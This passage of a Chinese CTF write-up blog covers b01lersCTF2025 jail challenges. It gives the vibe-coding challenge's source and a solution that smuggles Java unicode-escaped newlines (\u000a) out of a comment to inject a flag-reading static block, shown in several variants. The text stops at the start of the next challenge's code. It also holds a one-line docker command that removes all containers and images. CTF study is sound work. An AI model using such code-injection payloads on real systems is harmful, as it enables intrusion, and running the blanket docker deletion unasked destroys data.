<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="感觉就是jailCTF"><title>b01lersCTF2025</title><link rel=canonical href=https://baozongwi.xyz/p/b01lersctf2025/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="b01lersCTF2025"><meta property='og:description' content="感觉就是jailCTF"><meta property='og:url' content='https://baozongwi.xyz/p/b01lersctf2025/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='jail'><meta property='article:published_time' content='2025-04-19T15:22:21+00:00'><meta property='article:modified_time' content='2025-04-19T15:22:21+00:00'><meta name=twitter:title content="b01lersCTF2025"><meta name=twitter:description content="感觉就是jailCTF"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#jailvibe-coding>jail/vibe-coding</a></li><li><a href=#jailshakespearejail>jail/shakespearejail</a></li><li><a href=#jailjail>jail/&#187;=jail</a></li><li><a href=#jailprismatic>jail/prismatic</a></li><li><a href=#jailemacs-jail>jail/emacs-jail</a></li><li><a href=#jailmonochromatic>jail/monochromatic</a></li><li><a href=#cryptoasss>crypto/ASSS</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E8%B5%9B%E9%A2%98/>赛题</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/b01lersctf2025/>b01lersCTF2025</a></h2><h3 class=article-subtitle>感觉就是jailCTF</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-04-19T15:22:21Z>Apr 19, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>16 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 301 天前，文中的内容可能已有所发展或发生改变。</span></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>docker stop $(docker ps -aq) &amp;&amp; docker rm $(docker ps -aq) &amp;&amp; docker rmi $(docker images -q)
</span></span></code></pre></td></tr></table></div></div><h2 id=jailvibe-coding>jail/vibe-coding</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FILE_TEMPLATE</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>import java.io.*;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>public class Main {
</span></span></span><span class=line><span class=cl><span class=s2>    // </span><span class=si>%s</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    public static void main(String[] args) {
</span></span></span><span class=line><span class=cl><span class=s2>        // TODO: implement me
</span></span></span><span class=line><span class=cl><span class=s2>    }
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    public static String getFlag() throws IOException {
</span></span></span><span class=line><span class=cl><span class=s2>        // FIXME: we probably don&#39;t want the user accessing this; just throw for now
</span></span></span><span class=line><span class=cl><span class=s2>        throw new RuntimeException(&#34;Not implemented yet&#34;);
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        // var br = new BufferedReader(new FileReader(&#34;/flag.txt&#34;));
</span></span></span><span class=line><span class=cl><span class=s2>        // return br.readLine();
</span></span></span><span class=line><span class=cl><span class=s2>    }
</span></span></span><span class=line><span class=cl><span class=s2>}
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;</span><span class=se>\r</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;&#34;&#34;+
</span></span></span><span class=line><span class=cl><span class=s2>|        ______  _____  _____  ____    ______  _____   ______   ______  _____  _____   _____
</span></span></span><span class=line><span class=cl><span class=s2>|       |      &gt;/     ||_    ||    |  |   ___||     | |   ___| |   ___|/     \|     | |     |
</span></span></span><span class=line><span class=cl><span class=s2>|       |     &lt; |  /  | |    ||    |_ |   ___||     \  `-.`-.  |   |__ |     ||     \ |    _|_
</span></span></span><span class=line><span class=cl><span class=s2>|       |______&gt;|_____/ |____||______||______||__|\__\|______| |______|\_____/|__|\__\|___| |_|
</span></span></span><span class=line><span class=cl><span class=s2>+
</span></span></span><span class=line><span class=cl><span class=s2>Welcome to b01lersCorp Semantic LOad-balanced Program GENerator (SLOPGEN) v3.20.25.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>comment</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;Enter your prompt below:</span><span class=se>\n</span><span class=s1>&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># No tricks, please :)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>banned</span> <span class=ow>in</span> <span class=n>blacklist</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>banned</span> <span class=ow>in</span> <span class=n>comment</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Illegal characters: terminating...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/tmp/Main.java&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Write the prompt into the source file</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>FILE_TEMPLATE</span> <span class=o>%</span> <span class=n>comment</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># TODO: run the actual model !!!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Your program output:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;cd /tmp &amp;&amp; javac Main.java &amp;&amp; java Main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;===&#39;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以看到是进行了一个参数注入，如果可以绕过<code>//</code>，将恶意代码写入Java程序就可以获得flag了，本地换行发现这么去写代码确实可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Main</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// %s \u000a static {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=w> </span><span class=n>br</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>FileReader</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>br</span><span class=p>.</span><span class=na>readLine</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{}</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=err>\</span><span class=n>u000a</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// TODO: implement me</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>getFlag</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// FIXME: we probably don&#39;t want the user accessing this; just throw for now</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=s>&#34;Not implemented yet&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>如果python解析<code>unicode</code>，绕过的话就可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=err>\</span><span class=n>u000a</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=w> </span><span class=n>br</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>FileReader</span><span class=p>(</span><span class=s>&#34;/flag.txt&#34;</span><span class=p>));</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>br</span><span class=p>.</span><span class=na>readLine</span><span class=p>());</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{}</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=err>\</span><span class=n>u000a</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>本地测试成功，换flag位置即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=err>\</span><span class=n>u000a</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=w> </span><span class=n>br</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>FileReader</span><span class=p>(</span><span class=s>&#34;/svg/flag.txt&#34;</span><span class=p>));</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>br</span><span class=p>.</span><span class=na>readLine</span><span class=p>());</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{}</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=err>\</span><span class=n>u000a</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>结果还是不对，后面打通之后发现主办方是真C，给的docker的flag位置和服务器上的不一样</p><p><img src=/p/b01lersctf2025/QQ20250419-164126.jpg width=1434 height=648 loading=lazy alt=1></p><h2 id=jailshakespearejail>jail/shakespearejail</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/local/bin/python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
